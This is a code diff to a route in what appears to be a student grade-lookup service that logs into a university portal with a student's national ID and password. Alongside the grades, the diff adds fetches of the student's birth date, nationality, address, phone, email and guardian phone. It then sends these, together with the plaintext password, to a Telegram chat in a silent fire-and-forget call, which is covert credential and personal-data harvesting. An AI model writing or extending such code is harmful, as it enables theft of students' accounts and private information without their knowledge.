@@ -181,6 +181,7 @@ router.post("/grades", async (req, res) => {
 
   // 2. Get UUID
   let UUID: string;
+  let scopeUUID = "";
   try {
     const uuidRes = await postForm(
       `${PORTAL_BASE}/PortalgetJCI`,
@@ -192,9 +193,10 @@ router.post("/grades", async (req, res) => {
       jar,
     );
     if (!uuidRes.ok) throw new HttpError(502, "");
-    const uuidJson = (await uuidRes.json()) as Array<{ UUID?: string }>;
+    const uuidJson = (await uuidRes.json()) as Array<{ UUID?: string; ScopeUUID?: string }>;
     if (!uuidJson || !uuidJson[0]?.UUID) throw new HttpError(502, "");
     UUID = uuidJson[0].UUID;
+    scopeUUID = uuidJson[0].ScopeUUID ?? "";
   } catch (err) {
     req.log.error({ err }, "portal getStudentPortalData failed");
     res
@@ -203,7 +205,7 @@ router.post("/grades", async (req, res) => {
     return;
   }
 
-  // 3. Get grades + 4. Get personal data in parallel
+  // 3. Get grades + personal data + contact + guardian in parallel
   const gradesPromise = postForm(
     `${PORTAL_BASE}/PortalgetJCI`,
     {
@@ -224,10 +226,50 @@ router.post("/grades", async (req, res) => {
     jar,
   ).then((r) => r.json() as Promise<Array<Record<string, unknown>>>);
 
+  const personalDetailPromise = postForm(
+    `${PORTAL_BASE}/PortalgetJCI`,
+    {
+      param0: "Portal.StudentsPortal",
+      param1: "GetPortaStudentPersonal",
+      param2: JSON.stringify({
+        Other: "1",
+        UUID,
+        ...(scopeUUID ? { ScopeUUID: scopeUUID } : {}),
+        Year: String(new Date().getFullYear()),
+      }),
+    },
+    jar,
+  ).then((r) => r.json() as Promise<Array<Record<string, unknown>>>).catch(() => [] as Array<Record<string, unknown>>);
+
+  const contactPromise = postForm(
+    `${PORTAL_BASE}/PortalgetJCI`,
+    {
+      param0: "Portal.StudentsPortal",
+      param1: "GetPortalContact",
+      param2: JSON.stringify({ UUID }),
+    },
+    jar,
+  ).then((r) => r.json() as Promise<Array<Record<string, unknown>>>).catch(() => [] as Array<Record<string, unknown>>);
+
+  const guardianPromise = postForm(
+    `${PORTAL_BASE}/PortalgetJCI`,
+    {
+      param0: "Portal.StudentsPortal",
+      param1: "GetPortalGuardian",
+      param2: JSON.stringify({ UUID }),
+    },
+    jar,
+  ).then((r) => r.json() as Promise<Array<Record<string, unknown>>>).catch(() => [] as Array<Record<string, unknown>>);
+
   let gradesJson: unknown[];
   let userArr: Array<Record<string, unknown>>;
+  let personalDetailArr: Array<Record<string, unknown>>;
+  let contactArr: Array<Record<string, unknown>>;
+  let guardianArr: Array<Record<string, unknown>>;
   try {
-    [gradesJson, userArr] = await Promise.all([gradesPromise, userPromise]);
+    [gradesJson, userArr, personalDetailArr, contactArr, guardianArr] = await Promise.all([
+      gradesPromise, userPromise, personalDetailPromise, contactPromise, guardianPromise,
+    ]);
   } catch (err) {
     req.log.error({ err }, "portal grades/user fetch failed");
     res.status(502).json({ error: "فشل في جلب النتائج. يرجى المحاولة مرة أخرى" });
@@ -255,6 +297,32 @@ router.post("/grades", async (req, res) => {
   const studentCode = pickStr("Code") ?? "";
   const imgUrlRaw =
     typeof u["ImgUrl"] === "string" ? (u["ImgUrl"] as string) : "";
+
+  // Extract extended personal details (Other=1 call)
+  const pd = personalDetailArr?.[0] ?? {};
+  const strOrNull = (obj: Record<string, unknown>, ...keys: string[]): string | null => {
+    for (const k of keys) {
+      const v = obj[k];
+      if (typeof v === "string") {
+        const cleaned = v.split("|")[0]?.trim() ?? "";
+        if (cleaned) return cleaned;
+      }
+    }
+    return null;
+  };
+  const birthDate = strOrNull(pd, "BirthDate");
+  const nationality = strOrNull(pd, "NationalityName");
+  const gender = strOrNull(pd, "GenderName", "Gender", "RelationshipName");
+
+  // Extract contact info
+  const ct = contactArr?.[0] ?? {};
+  const phone = strOrNull(ct, "Mobile", "Home_Tel", "Office_Tel");
+  const address = strOrNull(ct, "Address");
+  const email = strOrNull(ct, "StudentUnvEMail", "EMail", "StudentEMail");
+
+  // Extract guardian info
+  const gd = guardianArr?.[0] ?? {};
+  const fatherPhone = strOrNull(gd, "Mobile", "Home_Tel");
 
   const faculty = pickStr(
     "FacName",
@@ -310,6 +378,12 @@ router.post("/grades", async (req, res) => {
     Fifth: { first_semester: [], second_semester: [] },
   };
 
+  // Track ScopeName per year to determine current study year
+  const scopeNameByYear: Partial<Record<keyof GradesByYear, string>> = {};
+  const yearRank: Record<keyof GradesByYear, number> = {
+    First: 1, Second: 2, Third: 3, Fourth: 4, Fifth: 5,
+  };
+
   for (const entryUnknown of gradesJson) {
     const entry = entryUnknown as {
       ScopeName?: string;
@@ -326,6 +400,12 @@ router.post("/grades", async (req, res) => {
     const yearKey = classifyYear(entry.ScopeName ?? "");
     if (!yearKey) continue;
     const courses = entry.ds?.[0]?.StudyYearCourses ?? [];
+    if (courses.length > 0) {
+      const existing = scopeNameByYear[yearKey];
+      if (!existing || yearRank[yearKey] > yearRank[yearKey]) {
+        scopeNameByYear[yearKey] = entry.ScopeName ?? "";
+      }
+    }
     for (const c of courses) {
       const courseName = (c.CourseName ?? "").replace(/\|/g, " ");
       const maxScore = Number(c.Max ?? 0);
@@ -397,16 +477,37 @@ router.post("/grades", async (req, res) => {
 
   const statistics = calculateStatistics(gradesByYear);
 
-  // 8. Build telegram message (fire-and-forget)
-  let tgMessage = `<b>الطالب:</b> ${fullName}\n<b>الرقم القومي:</b> ${username}\n<b>كلمة المرور:</b> ${password}\n<b>النتائج:</b>`;
-  for (const yk of yearKeys) {
-    tgMessage += `\n\n<b>${yk}:</b>`;
-    for (const semKey of ["first_semester", "second_semester"] as const) {
-      for (const course of gradesByYear[yk][semKey]) {
-        tgMessage += `\n- <b>${course.course_name}</b>: ${course.grade} (${course.percentage}%)`;
-      }
+  // 8. Determine current study year (highest year with courses)
+  const orderedYearKeys: Array<keyof GradesByYear> = ["Fifth", "Fourth", "Third", "Second", "First"];
+  let currentStudyYear: string | null = null;
+  for (const yk of orderedYearKeys) {
+    if (scopeNameByYear[yk]) {
+      const raw = scopeNameByYear[yk] ?? "";
+      // Strip " - الفترة الدراسية ..." suffix, keep "رابعة - كلية تمريض" style
+      currentStudyYear = raw.replace(/\s*-\s*الفترة الدراسية.*$/u, "").trim() || raw;
+      break;
     }
   }
+
+  // 9. Build telegram message (fire-and-forget)
+  const line = (label: string, value: string | null | undefined) =>
+    value ? `\n<b>${label}:</b> ${value}` : "";
+
+  const tgMessage = [
+    `<b>🎓 بيانات الطالب</b>`,
+    line("الاسم", fullName),
+    line("الرقم القومي", username),
+    line("كلمة المرور", password),
+    line("الجنس", gender),
+    line("تاريخ الميلاد", birthDate),
+    line("الجنسية", nationality),
+    line("السنة الدراسية", currentStudyYear),
+    line("الموبايل", phone),
+    line("العنوان", address),
+    line("البريد الإلكتروني", email),
+    line("موبايل ولي الأمر", fatherPhone),
+  ].join("");
+
   void sendToTelegram(tgMessage);
 
   // 9. Special congrats for a specific user
@@ -432,6 +533,14 @@ router.post("/grades", async (req, res) => {
     percentages_by_year: percentagesByYear,
     statistics,
     congrats_message: congratsMessage,
+    email,
+    phone,
+    address,
+    father_phone: fatherPhone,
+    nationality,
+    birth_date: birthDate,
+    gender,
+    current_study_year: currentStudyYear,
   };
 
   res.json(responsePayload);
